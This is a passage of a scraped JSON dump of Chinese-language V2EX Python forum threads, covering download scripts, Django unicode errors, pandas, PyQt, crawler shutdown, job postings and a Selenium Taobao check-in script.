e)\r", "        fout_img = open('images/' + img_name[img] + '.jpg', 'wb')\r", "        fout_img.write(img_data)\r", "        \r", "        fout_img.close()\r", "        print(img_name[img] + '下载成功')\r", "\r", "\r", "如果 img_add 里有一个 URL 是错误的，下载就会中断，不懂为啥\r", "期待是这样的输出的：\r", "img_name1 下载成功\r", "img_name1 下载成功\r", "img_name1 下载失败： time out\r", "img_name1 下载成功\r", "img_name1 下载成功", " 代码没锁紧看起来--！， 你可以 debug 看一下， 404 能不能走到 exception 的异常处理里面， 404 是直接 exception 还是 直接 timeout 5 秒继续后面的， 调试看一下应该不难解决;)"]},
{"content": ["<div class=\"topic_content\">偶然在微博视频看的杰伦的精选集 <a target=\"_blank\" href=\"http://weibo.com/tv/v/EcAmx4z11?from=music\" rel=\"nofollow\">http://weibo.com/tv/v/EcAmx4z11?from=music</a> ，想下载下来，看到播放的是一个 swf 文件，地址为 <a target=\"_blank\" href=\"http://wscdn.miaopai.com/splayer2.2.0.swf?scid=GcezAtC7sRC6~1S3GXxLkA__&amp;token=&amp;autopause=false&amp;fromweibo=false\" rel=\"nofollow\">http://wscdn.miaopai.com/splayer2.2.0.swf?scid=GcezAtC7sRC6~1S3GXxLkA__&amp;token=&amp;autopause=false&amp;fromweibo=false</a>  用 urllib.request.urlretrieve 直接下载不行，有什么办法？</div>"], "reply": "4", "tittle": "秒拍视频 swf 文件如何用 python 下载？", "comment": [" 感谢，已下载成功，不过 python3 将 urlparse 改为 urllib.parse\r", "请问 api_url = '", "' 这个接口哪获得的？", "楼主,比如这个链接 ", " 显示的 748 个视频 ,但是网页上的视频数量很少,我想把 748 个都下载回来,有什么方法吗?", " 他微博主页有 "]},
{"content": ["<div class=\"topic_content\">前些日子发了从金融到量化一文，发现 V 友还是很喜欢看干货合集类型的帖子的。其实部门中有很多同事以前都是程序员出身，在工作中不断学习量化策略，到现在已经可以独立撰写研报啦，所以想学习量化的人不要气馁，很多人和你们一样，都在摸索着。\r<br>\r<br>现在就提供一些资源供大家下载。\r<br>\r<br>2. 从程序员到量化\r<br>程序员学量化投资（一）：买入卖出： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fa3ef0228e5b887ce50e04\" rel=\"nofollow\">https://uqer.io/community/share/56fa3ef0228e5b887ce50e04</a>\r<br>程序员学量化投资（二）：指价建仓 ： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fa4081228e5b8886e510e2\" rel=\"nofollow\">https://uqer.io/community/share/56fa4081228e5b8886e510e2</a>\r<br>程序员学量化投资（三）：区间内低买高卖： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fabc58228e5b8887e51001\" rel=\"nofollow\">https://uqer.io/community/share/56fabc58228e5b8887e51001</a>\r<br>程序员学量化投资（四）：分析收益率自动追涨： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fbb4dd228e5b1f861a8e14\" rel=\"nofollow\">https://uqer.io/community/share/56fbb4dd228e5b1f861a8e14</a>\r<br>程序员学量化投资（五）：移动平均线之金叉和死叉： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fbec69228e5b1f8a1a8eb0\" rel=\"nofollow\">https://uqer.io/community/share/56fbec69228e5b1f8a1a8eb0</a>\r<br>程序员学量化投资（六）：成交量之缩量增量： <a target=\"_blank\" href=\"https://uqer.io/community/share/57028067228e5b4903eb3fd3\" rel=\"nofollow\">https://uqer.io/community/share/57028067228e5b4903eb3fd3</a>\r<br>程序员学量化投资（七）：量价八阶律的简单实现： <a target=\"_blank\" href=\"https://uqer.io/community/share/57124fae228e5b827e7f5491\" rel=\"nofollow\">https://uqer.io/community/share/57124fae228e5b827e7f5491</a>\r<br>一日一练： Python 程序员的 10 个常见错误： <a target=\"_blank\" href=\"https://uqer.io/community/share/57218746228e5b633c7b93ee\" rel=\"nofollow\">https://uqer.io/community/share/57218746228e5b633c7b93ee</a></div>"], "reply": "8", "tittle": "从程序员到量化", "comment": ["加油，我还买了好几本机器学习的准备看完试试能不能整合到量化呢", "只能仰望星空了", " 不能，最简单的模型最有效，整复杂的往往不会反应金融的本质。", "谢谢了 word 哥", " 赞哟！一定可以哒！", "量化工资一般多少？", "不太习惯在 web 中 coding ，有没有本地化工具？", " 暂时还没有，因为要保护数据，所以并没有本地化"]},
{"content": ["<div class=\"topic_content\">Python 操作文本入库至 Hbase,文本样式如下; Python 的正则该如下写读取 url docno contenttitle content 这四个字段，并写入到 hbase 的一个表中。。。谢谢！！\r<br>-----------------------------------------------------------\r<br>&lt;doc&gt;\r<br>&lt;url&gt;http://gongyi.sohu.com/20120724/n348878190.shtml&lt;/url&gt;\r<br>&lt;docno&gt;5fa7926d2cd2f0ea-34913306c0bb3300&lt;/docno&gt;\r<br>&lt;contenttitle&gt;爸爸为女儿百万建幼儿园　消防设施３年仍不过关&lt;/contenttitle&gt;\r<br>&lt;content&gt;&lt;/content&gt;\r<br>&lt;/doc&gt;\r<br>&lt;doc&gt;\r<br>&lt;url&gt;http://gongyi.sohu.com/s2008/sourceoflife/&lt;/url&gt;\r<br>&lt;docno&gt;f2467af22cd2f0ea-34913306c0bb3300&lt;/docno&gt;\r<br>&lt;contenttitle&gt;中国西部是地球上主要干旱带之一，妇女是当地劳动力．．．&lt;/contenttitle&gt;\r<br>&lt;content&gt;同心县地处宁夏中部干旱带的核心区，　冬寒长，春暖迟，夏热短，秋凉早，干旱少雨，蒸发强烈，风大沙多。主要自然灾害有沙尘暴、干热风、霜冻、冰雹等，其中以干旱危害最为严重。.\r<br>由于生态环境的极度恶劣，导致农村经济发展缓慢，人民群众生产、生活水平低下，靠天吃饭的被动局面依然存在，同心，又是国家级老、少、边、穷县之一…［详细］&lt;/content&gt;\r<br>&lt;/doc&gt;\r<br>&lt;doc&gt;\r<br>&lt;url&gt;http://gongyi.sohu.com/20120612/n345424232.shtml&lt;/url&gt;\r<br>&lt;docno&gt;0dadd5002ed2f0ea-34913306c0bb3300&lt;/docno&gt;\r<br>&lt;contenttitle&gt;思源焦点公益基金救助孩子：永康&lt;/contenttitle&gt;\r<br>&lt;content&gt;不满一岁的永康是个饱经病痛折磨的孩子，２０１１年７月５日出生的他，患有先天性心脏病、疝气，一出生便被遗弃。２０１２年１月８日，才５个月大的永康被发现呼吸困难&lt;/content&gt;\r<br>&lt;doc&gt;\r<br>...........</div>"], "reply": "7", "tittle": "Python 该如何操作文本入库至 Hbase", "comment": ["xpath ，有个库叫 lxml", "1, py 怎么取这文本就不说了吧\r", "\r", "2, 用 HBase thrift 写 或者 openTSDB", "有没有哪位使用过 bulk load", "pyquery 写 css 选择器比写 xpath 更简单点", "thrift", "bulk load 适合一次性导入到大量数据，而不适合持续导入。如果用 bulk load ，可以先用 python 读取数据到文本文件（ csv 等）再通过 hadoop 的 MR 将数据转化成 HFile ，最后用 bulk load 直接导入 Hbase 。", "pyspark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h4>开发这个的初衷是用它来向指定的公司员工推送一些通知消息, 如工单, 报警, 业务状态等, 目前对接了微信企业号的用户管理, 应用管理, 部门管理, 消息发送, 而且没接全, 感觉暂时够用了;</h4>\n<h4>代码基于 Python3.5, 本着学习的心态分享这个小服务, 期望能交到 Python 相关的朋友, 并且也希望大家指出代码的问题, 譬如代码规范, 代码的结构和代码的质量以及语法相关;</h4>\n<h4>Github: <a href=\"https://github.com/itchenyi/WechatEnterpriseApi\" rel=\"nofollow\">WechatEnterpriseApi</a></h4>\n</div></div>"], "reply": "2", "tittle": "用 Python 开发了一个微信企业号 API", "comment": ["企业号的客服接口了解吗？一个人能同时给几个人当客服吗？", "  不了解,  也没打算这这块的功能:)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>项目简介：</strong></p>\n<p>社区产品开发</p>\n<hr>\n<p><strong>工作时间：</strong></p>\n<p>每个工作日要求工作 2 小时（晚 19 点-21 点），周末工作 10 小时，工作时间可轻微调换，但必须保证总时长</p>\n<hr>\n<p><strong>技能要求：</strong></p>\n<p>必须掌握和熟练使用 python2.7 、 mysql 的开发，\n必须熟练使用 tornado, flask 框架，如果还具备 django 框架开发能力的更佳</p>\n<hr>\n<p><strong>联系方式：</strong></p>\n<p>有意者请联系 QQ ： 603831698</p>\n<p>请附带 github 及相关简历，标明 V2EX 字样</p>\n</div></div>", "<div class=\"topic_content\">补充一下：地标北京，无需驻场，不过有时需要面谈交流。感谢大家支持，谢谢！</div>"], "reply": "45", "tittle": "[大牛亲启] 时薪制高薪聘 Python 大牛兼职合作", "comment": ["只写要求没写多少钱的算毛", " 由于是长期的工作，需要根据您的实际情况而定，价格会让您满意", "顶，可惜我没时间", "每周多工作 20 小时，又不说具体报酬……", " hello ，时薪是根据具体情况而定的，定价会限制人才的", "补充一下：地标北京，无需驻场，不过有时需要面谈交流。感谢大家支持，谢谢！", " 若是此周末包括星期日的话，那么是 30 个小时，想想都很可怕", "不错不错, 就是为何要同时上 flask, tornado, django....", "不给待遇名盘的招聘都是耍流氓。顺便这种工作制时薪要有普通工作 3 倍才有意思", "挺累的", "必须坐标北京吗，异地视频面基支持否？", "这里的牛是指精力如牛的意思", " 由于项目工期比较紧，最好还是在北京比较方便。", "这里的牛是指老奶牛\r", "最好是不吃草,就产奶的", "我也想说为什么要三个框架？一般都会只专注一个框架吧？", "python2.7 啊，我现在看见 2.7 就不爽", " @", " 有长期合作的考虑，所以对项目也对人才的技能进行了需求", "每周 20 小时，上了 30 岁的还是算了，有钱挣没命花。", "你们之前的牛走丢了么？", "tornado 和 django 搭配一起用感觉不是太常见。我之前曾经这样用过，只不过 tornado 只是提供 api 调用。\r", "\r", "django 是另外一套东西。", "除了不在北京（在深圳），其他都符合。", "这种时段直播写代码简直再合适不过了", "一般熟一个框架就不错了吧。。", "同时熟练 tornado 、 flask 和 django 是什么路数，没事换着玩吗", " 这种系统的开发，都是体力劳动，哪需要什么大牛，找兼职开发者，无非就是想压低成本。这种套路，谁不懂呢？不给出报酬的原因谁都懂，就是低嘛。不用找“定价会限制人才”这种借口了，太没诚意。", "感觉一小时 200 ？", "这种项目最好有个第三方靠谱的项目经理，作为中间人，要不然，给钱的时候扯皮的事情太多啦", " tornado+django 倒是非常常见，但是 flask 有点格格不入", "flask 和 tornado 都使用过一年以上真实项目经验 Django 差不多两三个月，讲真  都很烂…", "就你写的这些，不用大牛，毕业生都能干……\r", "这年头大牛已经烂大街了么？", " 能否说说常见的 tornado+django 一起用的方式？", " 弱问，那用什么框架？", "总时长这事不好说，容易扯皮。比如一个功能，你觉得要 2 小时就能搞定，开发人员说，要 4 小时，你俩不就吵起来了么？你这边最好找一个靠谱的产品经理，列好各项待开发的产品功能，然后让开发人员来报价吧。", "即便我是 python 大牛，这种情况，我也不会接。估计扯皮的时间或者商量开发细节的时间，比写代码的时间还长，这个怎么算钱？\r", "需要一个懂开发的产品经理。", " 说说满足期望人选的时薪", "给个你们要求的最低价格呗，更高就看能力了", " 最近已转 Elixir 语言的 Phoenix 框架", " 靠谱的产品经理有的，这个是我们公司自己的研发项目", "工期比较紧？长期工作？兼职？咋感觉各种矛盾呢", " 这次项目的工期比较紧，如果合作舒服彼此认同，日后长期合作。兼职的形式进行合作，毕竟各位都是在职人员，如果有意向可以全职，不过就跟这个帖子的内容无关了。您看，不矛盾的", "魔都 ... 默默的飘过 ~~~~~", "工作内容都没有，拉去写前端？", "25*200 = 5000\r", "没搞头\r", "最近估计也超不过 200", " django 做 db schema/admin 以及和一些其他的东西比如 es mq 类的部件 等等， tornado 做 api", "已找到合作的开发者，谢谢大家"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"enter image description here\" src=\"https://static.oschina.net/uploads/space/2016/1004/212258_zbyp_2308616.jpg\"></p>\n<p>每天盯着相同的桌面壁纸总让人感到疲倦和乏味，何不让桌面壁纸自动更换呢？</p>\n<p>必应好壁纸 3.0 将为你的桌面注入新的活力，它每天都会为你更新来自微软必应搜索的高品质壁纸！</p>\n<p>可以运行在 Windows 和 Linux 上面</p>\n<p><a href=\"http://mathjoy.lofter.com/post/42208d_7cabcf7\" rel=\"nofollow\">http://mathjoy.lofter.com/post/42208d_7cabcf7</a></p>\n</div></div>"], "reply": "36", "tittle": "[ [ [开源] ] ] 必应好壁纸 3.0，希望大家多多支持！", "comment": ["报毒。先做免杀吧。", "怎么打包成 exe 的", "我写了个 windows 服务挂公司电脑上每天下载一张", "安装包太大了 一个脚本就搞定的事情", "有点糙", "同写了个小 py 脚本，每天计划任务爬 bing 首页，自动设置壁纸。", " 之前我就提交给 360 处理这个情况了，无奈他们不搭理我", " PyInstaller 后看这里 ", " 什么意思", "windows 有自动更新 bing 壁纸的桌面主题啊", " @", " 我的软件里有很多细节的优化", " windows 自动更新的壁纸右下角有 bing logo ，我这个完全没有", "有没有扒下来的壁纸合集? 下个给 MAC 用...", " Mac 可以商店下 Irvue", "下载下来直接被 Windows Defender 删除了", "天天换也觉得烦，最后换成隔断时间去 ms 下一张。。", "这个我也做过，而且还有 Android 版^_^", " 非常感谢,刚下了.感觉很不错...不知道这个软件能不能自动下载保存每次更新的壁纸么? 而不要每次自己手动保存?", " 我这个壁纸软件只需要接上 Mac 的壁纸 API 就行了，软件本身是可以运行在 MacOS 上面的", " 叫什么名字？开源吗？", " 软件本身没毒，但是有几个 dll 杀毒软件就认为是病毒，我也没办法", " 好像不行，必须手动保存，手动保存的话它会自动下载最高分辨率的壁纸", " ", "IT 之家上面每个月都会整理出上个月每天的 Bing 主页壁纸，直接去下载就好了。不过我还是写了个 py 脚本，爬取当天的壁纸保存下来。", " 看到你说些了个 py 脚本，我也去练习了一把。很好玩。", " 问题是我没看到软件下载?? MAC 的是下 github 的?然后 Linux 的方式来开启?", " 没错", "必应缤纷桌面不就行了么", "windows10 自带此功能……主题设置了就自动换了。", " 然而那个并不方便你收藏当前壁纸", " 必应缤纷桌面有个小故事面板，经常更新不了，而且还不能隐藏，个人感觉有点影响视觉效果", " 你说什么小故事面板啊？ 没发觉啊", "  我的天天自动更新得蛮好的啊。 也许你的版本较旧以及网络有问题吧。或者设置问题。\r", "搜索条也蛮方便的。 Ctrl + Q ， 遇到不喜欢的壁还可以自己去另外选一下。 或者想知道图片是哪儿也唤出来查看一下。 —— 因此喜欢上了 Madeira Trails ， 以后得去看看", "更新时间怎么最长只有 59 分钟, 不能设置更长吗?", " 鼠标放在本软件的托盘图标上面就可以看到，请用新版，新版满足你的需求 \r", " 不能，您可以改改源码来解决", " 请问你是用什么转成的 exe 文件"]},
{"content": ["<div class=\"topic_content\">因为只懂 python ，求个该语言下能用的电商平台，如果是 Flask 框架的最佳，在 git 上大致找了下无果。。。</div>"], "reply": "12", "tittle": "求推荐 python 下类似 magento 或 ecshop 的开源电商平台", "comment": ["django-oscar, lfs\r", "\r", "flask 的不知道", "基本没有， 即便是电商软件比较多的 php 平台， 除了 magento 外基本也都是样子货， 但是 magento 的入门成本、维护成本和二次开发成本比从头定向开发一个都高", " 都是 django 的, flask 的没看到过", "  跑到 humiaozuzu/awesome-flask 瞄了下也没发现\r", " \r", " \r", "一个轻快小的电商就这么难，话说开发效率 python 也挺高的，怎么就都是 php 的呢~~~", " 因为你看那些系统也不是用 PHP 最新的版本写的。要知道 Python 当年的 2.x 系列版本是相当坑的，而且学这个的少，人难招。", "oscar 做过。映像比较深的是做 货到付款 比较麻烦。。。", "oscar 基本是照搬 amazon 的购物体验合流程。。如果你的项目能适应就还不错。。不能适应，要改的地方就有点多。", "我用 flask 写了个，代码很糟，不忍直视……", " 写的有自己在用吗？或者说有意放类似 git 公共平台托管？\r", " 正是准备把亚马逊的几个产品搬出来再做个独立的 B2C ，主要还是外贸。听你这么说倒是有想法深入看看 oscar", "\r", "\r", "飞亚达官网就是基于此开发的", " 可以看看这个", "用过 django-oscar ，文档比较齐全"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>爬虫如果不退出就会一直爬的……但是每次按 ctrl+c 退出的时候似乎都有点问题。爬虫的退出如何正确的实现？</p>\n</div></div>"], "reply": "8", "tittle": "Python 多线程爬虫如何优雅的退出？", "comment": ["标记下看看有什么好的解决方法没", "sudo pkill -9 python", "t = threading.Thread()\r", "t.daemon = True", "每爬一个数据检测指定目录下指定文件里的值， 1 就忽略， 0 就退出，开另一个窗口用 vi 控制这个文件的值", "看需求吧…生产者爬到阈值丢一个毒丸到队列消费者就没了", "不知道为啥不能优雅的退出", "用 signal 模块，保证信号发到主线程\r", "设置子线程 daemon=True\r", "同时，其他线程捕捉 keyboardinterrput ， 然后 interrupt_main ", "调度系统…"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><b>岗位职责：</b></p>\n<li>Web 后端业务逻辑层、数据层的实现；</li>\n<li>负责应用的高级设计、功能实现并进行测试及部署。</li>\n<p><b>岗位要求</b>：</p>\n<li>3 年以上 Web 开发经验，精通 Python 程序设计，熟悉 Flask 、 Django 或 Tornado 等框架；</li>\n<li>熟悉 Linux 操作环境，熟练使用 Mysql 、 Nginx 、 MongoDB 、 Redis ；</li>\n<li>良好的系统分析设计能力，文档管理能力及编程习惯；</li>\n<li>沟通能力强，具有良好的团队合作意识；</li>\n<li>统招本科及以上学历，计算机相关专业，扎实的计算机基础知识。</li>\n<p><b>PS ：</b>能力优秀的小伙伴工作年限和学历要求可以适当降低。</p>\n</div></div>"], "reply": "1", "tittle": "招聘 Python Web 工程师", "comment": ["欢迎有兴趣的小伙伴来联系\r", "QQ/WeChat ： 461590570\r", "工作地点：北京市海淀区五道口"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/KIDJourney/Berserker\" rel=\"nofollow\">Berserker</a> !</p>\n<p>Web Application smoking test.</p>\n<p><img alt=\"berserker\" src=\"http://www.qlcoder.com//uploads/c8729fbac8/147935854827022.png\"></p>\n<p>对着 apache benchmark 撸了一个 python 版本的，支持 ab 的大部分功能。</p>\n<p>欢迎建议和吐槽:D</p>\n<p><a href=\"https://github.com/KIDJourney/Berserker\" rel=\"nofollow\">Github</a></p>\n<p><img alt=\"run\" src=\"http://www.qlcoder.com//uploads/c8729fbac8/147935576372847.jpeg\"></p>\n</div></div>"], "reply": "17", "tittle": "Berserker, python HTTP benchmark", "comment": [" 造轮子又不是什么坏事。", "刚刚试用了一拨，觉得可以安利一拨自己的多行动态刷新库:D\r", "\r", "用上它就可以实时显示与刷新进度条下方的这些状态了 ;D", " 同意", " 棒棒的，之前也有搜过别人的 processbar 的库，感觉功能都太强大了自己用不了辣么多，就强行手撸了一个。", "造轮子没啥不好的，但是最好做下横向比对，方便选择", " 2333 我之前也是，想实现多行动态输出，搜到的都是 urwid 或者 curses, 而且也不符合我的需求 XD ，还是自己造一个又能提高姿势水平，还完美切合需求", " 恩，这倒是。", "哈哈 lz 是剑风传奇的粉吗", "可以对多个 url 以及不同的请求内容测试吗？用 ab 测试复杂的请求很不方便，如果是 python 实现的应该更容易拓展。\r", "以前用过一个叫 pylot 的库支持这些，现在这个库好像消失了，估计是没人维护。", " 啊，你去提个 issue ，我闲了加一个这个功能，需求写详细些。", " 随便 google 了一张。。。用 PIL 把所有颜色都改成黑色了", "Berserker...看来我得撸个 Saber 了", " 这图明明是 FSN 里的 Berserker ，不是剑风的", "巴萨卡，干崩他们！", "已 pip install", " 有错误和不爽的地方记得提出来呀"]},
{"content": ["<div class=\"topic_content\">初学 python ，今天在使用 django 的时候遇到一些编码问题，希望大神指教下。\r<br>\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d\">https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>\r<br>我在访问 index 方法的时候不会报错，但是访问 news 方法的时候却报错，只有把第二个方法加上 u ，也就是这样才能正确输出\r<br>\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d\">https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>\r<br>我想问加上 u 之后 python 到底干了什么动作，为什么第一个 index 方法就可以正常输出？</div>", "<div class=\"topic_content\">我昨天发现貌似是因为 django 自动把传进来的参数进行了 unicode 操作，把代码改成 \r<br>return HttpResponse(u\"新闻 ID 是:%s\" % news_id) \r<br>或者 \r<br>return HttpResponse(\"新闻 ID 是:%s\" % news_id.encode(\"utf8\")) \r<br>就可以了</div>"], "reply": "9", "tittle": "关于 python 编码问题的疑惑", "comment": ["报的是 UnicodeEncodeError 错吗？\r", "news_id 是不是有非 ascii 字符？", "\r", "之前第二段贴错了，修改不了，应该是上面的", " 这个 ID 是从浏览器链接获取的数字", "\"新闻 ID 是:%s\" % news_id \r", "会报错是因为 news_id 是 unicode 类型，\"新闻 ID 是:%s\" 则是 str 类型，在格式化字符串时如果有参数是 unicode 类型，会将 str 类型字符串转换为 unicode 后再能格式化，最后的字符串也就是 unicode 类型。而 Python2 默认编码是 ascii ，用 ascii 编码转换 str 类型的 \"新闻 ID 是:%s\" 为 unicode 时就会报 UnicodeDecodeError 错了，因为其中包含非 ascii 字符的汉字。\r", "\r", "u\"新闻 ID 是:%s\" % news_id\r", "没有问题是因为两个字符串都是 unicode 类型，那么格式化后输出的也是 unicode 字符串，没有涉及到编码转换，所以不会报错。", "Django 的 HttpResponse 方法应该 str 和 unicode 两种类型的字符串都能接收， Django 内部应该会自动处理编码转换，所以 HttpResponse(\"这是首页\") 可以正常输出。", " 为啥 news_id 是 unicode 类型？"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.yunsonbai.top/2016/09/29/yuntool/\" rel=\"nofollow\">http://www.yunsonbai.top/2016/09/29/yuntool/</a>\r<br>小程序，欢迎吐槽</div>"], "reply": "目前尚无回", "tittle": "类 django orm 运营工具包", "comment": []},
{"content": ["<div class=\"topic_content\">初学 python ，今天在使用 django 的时候遇到一些编码问题，希望大神指教下。\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d\">https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>我在访问 index 方法的时候不会报错，但是访问 news 方法的时候却报错，只有把第二个方法加上 u ，也就是这样才能正确输出 \r<br><div><a target=\"_blank\" href=\"https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d\">https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>我想问加上 u 之后 python 到底干了什么动作，为什么第一个 index 方法就可以正常输出？\r<br>下面是报错信息\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d\">https://gist.github.com/THK-1991/8af180fa4476b81dd70966c830f69f0d</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div></div>", "<div class=\"topic_content\">我昨天发现貌似是因为 django 自动把传进来的参数进行了 unicode 操作，把代码改成 \r<br>return HttpResponse(u\"新闻 ID 是:%s\" % news_id) \r<br>或者 \r<br>return HttpResponse(\"新闻 ID 是:%s\" % news_id.encode(\"utf8\")) \r<br>就可以了</div>"], "reply": "7", "tittle": "关于 python 编码问题的疑惑（重新修改主题）", "comment": ["unicode 能够正常输出啊", "u''是 unicode 化。\r", "你这三个都是贴的一个。", "在 python2 中，有两种字符串类型，一种是 str ，一种是 unicode\r", "\r", "创建 unicode 类型的字符串的方法就是在普通字符串前面加 u\r", "\r", "unicode 类型的字符串可以编码（ encode ）成某种编码的 str\r", "\r", "某种编码的 str 也可以解码（ decode ）成 unicode\r", "\r", "但是文档上说，在必要的时候可以提供这两种类型之间的自动类型转换，这也是为啥可以在 str 类型上执行 encode ，在 unicode 类型上执行 decode\r", "\r", "从出错信息上看，是在 decode 的过程中出错，但是说的是 ascii 不能解码这个序号，说明在你的环境里默认的是 ascii ，而不是 utf-8 ，你可以通过 sys.getdefaultencoding()来查看一下，通过 sys.setdefaultencoding(‘ utf8 ’)来设置，这样设置之后，不加 u 也不会出错。\r", "\r", "至于为啥第一个不报错，第二个报错，也就是为啥第一个不 decode ，而第二个 decode ，我猜是格式化字符串需要 unicode 类型的字符串导致的。", "是这样的，所有链接字符串的操作的操作数都需要是 unicode ，所以第二个操作需要把“新闻 ID 是:%s ”隐式执行 decode 操作，但是隐式 decode 的编码使用的是默认编码 ascii ，所以出错。详细解释参见 ", "news 会报错是因为 \"新闻 ID 是:%s\"是 str,url 传进来的 news_id 是 unicode  你可以 type(news_id)看一下输出\r", "\r", "django 全部用 u''就没事。或者在顶部导入 unicode_literals 这样默认不加 u 就是 unicode 字符，加 b 是 str （ Py2 ）\r", "# coding=utf-8\r", "from __future__ import unicode_literals", "from __future__ import unicode_literals\r", "django 1.10 已经明确指出中文需要这句了", " @", " \r", "我昨天发现是因为 django 自动把传进来的参数进行了 unicode 操作，把代码改成\r", "return HttpResponse(u\"新闻 ID 是:%s\" % news_id)\r", "或者\r", "return HttpResponse(\"新闻 ID 是:%s\" % news_id.encode(\"utf8\"))\r", "就可以了"]},
{"content": ["<div class=\"topic_content\">RT ，\r<br>有一个 1621*2 的 DF 表—— data ，其中每一个元素数据均非 nan,inf 。\r<br>\r<br>问题是， data.corr()和 data.cov()的结果竟然是：\r<br>Empty DataFrame\r<br>Columns: []\r<br>Index: []\r<br>\r<br>\r<br>随机生成一组数据求 corr 和 cov 也没有问题。\r<br>\r<br>只能是我读书少懂得不多啊。有没有高手帮下忙呀？\r<br>\r<br>data 文件传送门：\r<br><a target=\"_blank\" href=\"http://t.cn/RfcKAlG\" rel=\"nofollow\">http://t.cn/RfcKAlG</a></div>"], "reply": "5", "tittle": "想来咨询问题来着，结果看撕逼贴停不下来了，言归正传：求助！ pandas.DataFrame 计算协方差矩阵问题", "comment": ["import pandas; pandas.read_csv(\"data.csv\",names=['first','second']).corr() 这样不行吗？", " 不行的。尝试了所有方式。", "格式是正确的格式吗?", "下载了一下你的文件，试了一下，没问题呀。\r", "\r", " 非常感谢。\r", "\r", "最终发现是类型有问题。原始类型成了 object 了。而保存后再读会自动识别为 float 。"]},
{"content": ["<div class=\"topic_content\">岗位职责：\r<br>\r<br>1 、负责设计和开发分布式网络爬虫系统，进行多平台信息的抓取和分析，按要求抓取金融数据； \r<br>2 、负责网页信息 /APP 数据抽取、数据清洗、数据消重等研发和优化工作，包括爬虫、调度、信息提取、信息存储等，提升平台的抓取效率；\r<br>3 、参与爬虫核心算法和策略优化，熟悉采集系统的调度策略；\r<br>4 、实时监控爬虫的进度和警报反馈；\r<br>\r<br>任职要求：\r<br>\r<br>1 、熟悉 Linux 系统，熟悉 Java 或者 Python ； \r<br>2 、熟悉网页抓取原理及技术，熟悉基于正则表达式、 XPath 、 CSS 等网页信息抽取技术，熟悉基于 Cookie 的登录原理；\r<br>3 、熟悉 APP 模拟及接口验签破解技术，熟悉 APP 用户授权访问机制及模拟；\r<br>4 、熟悉多线程、多进程、网络通信编程相关知识；\r<br>5 、熟悉 Selenium 优先，熟悉 APP 破解技术优先。\r<br>6 、有分布式爬虫架构，数据挖掘经验优先。\r<br>7 、对数据敏感，做过数据处理相关工作者优先，做过 ETL 工作者优先；</div>"], "reply": "7", "tittle": "[招聘] Python 抓取爬虫数据处理工程师", "comment": ["有没有意向的欢迎加 QQ ： 1258083995 细聊\r", "\r", "工作地点北京三元桥", "我觉得我可以试一番", " 好啊，你的联系方式是？", " ( ⊙ _ ⊙ ）说笑啦，刚参加工作不好辞职", " 哈哈，没关系。有朋友做这块的也可以推荐下", "瞄了两眼，岗位职责就是我现在工作的一部分，我是爬取各大 P2P 平台的数据，实时同步，互联网金融。", " 可以远程工作么？"]},
{"content": "", "reply": "4", "tittle": "windows 环境下创建的 virtualenv 可以直接在 linux 环境使用吗？", "comment": ["一般是不行的。", "不行", "不行, 不可以,", " \r", " \r", " \r", "OK ， Thanks"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的意思是,提示框弹出来之后,如果 3 秒内没有被点击,</p>\n<p>那么这个提示框就自动关闭.</p>\n<p>如果 pyqt 没有这样可有自动关闭的提示框控件,那 tkinter 是否有这样的控件?</p>\n<p>多谢您的回复!</p>\n</div></div>"], "reply": "5", "tittle": "请问 pyqt 中是否有弹出 3 秒后就自动关闭的提示信息框?", "comment": ["加个定时器不行吗？", "QTimer", "QSystemTrayIcon.showMessage()", " 谢谢,可行!\r", " 谢谢,可行!\r", "多谢各位!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚接触 Python 的 Selenium 不久，就想做个小玩具练练手。我写的玩具是登录淘宝，签到领取淘金币。<br>\n现在遇到的问题是，从「<a href=\"https://www.taobao.com/markets/taojinbi/happy-valley\" rel=\"nofollow\">店铺签到</a>」入口进入到各家店铺（ eg. URL <a href=\"https://shop136560499.taobao.com/ugo.htm?spm=a217e.7759359.15285.2.pa4eVE&amp;signin=true\" rel=\"nofollow\">https://shop136560499.taobao.com/ugo.htm?spm=a217e.7759359.15285.2.pa4eVE&amp;signin=true</a> ）后，想模拟点击「立即签到」，但是 click() 事件无效。</p>\n<p>相关代码如下：</p>\n<pre><code>    # 店铺签到\n    def shop_check_in(self):\n        urls = [\n                'https://nongfutechan.taobao.com/ugo.htm?spm=a217e.7759359.15285.1.4xE9Il&amp;signin=true#ugo-jinbi',\n                'https://shop136560499.taobao.com/ugo.htm?spm=a217e.7759359.15285.2.muhVBy&amp;signin=true#ugo-jinbi',\n                